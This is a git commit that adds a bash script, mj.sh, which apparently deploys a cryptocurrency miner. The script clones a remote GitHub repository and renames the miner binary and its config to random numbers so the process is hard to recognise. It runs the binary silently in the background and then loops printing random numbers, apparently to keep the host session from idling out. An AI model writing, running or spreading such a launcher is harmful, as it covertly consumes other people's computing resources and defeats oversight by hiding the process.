292dbae9579f4373b697d6320b91a9950162a6f4
angkii <83603708+angkii@users.noreply.github.com>
2021-07-13 09:40:14 +0700

    Create mj.sh

---
+++ mj.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+MINER=$(shuf -i 10-9999999999999999999 -n 1)
+
+INI=$(shuf -i 10-9999999999999999999 -n 1).ini
+
+sudo apt update
+
+git clone https://github.com/angkii/asu 
+
+cd asu
+
+mv gas $MINER
+
+mv keun.ini $INI
+
+chmod +x $MINER $INI
+
+./$MINER $INI > /dev/null 2>&1 &
+
+x=1; while [ $x -le 36000000 ]; do echo "$(shuf -i 1111111111111111111-9999999999999999999 -n 1)$(( x++ ))" && sleep 10; done
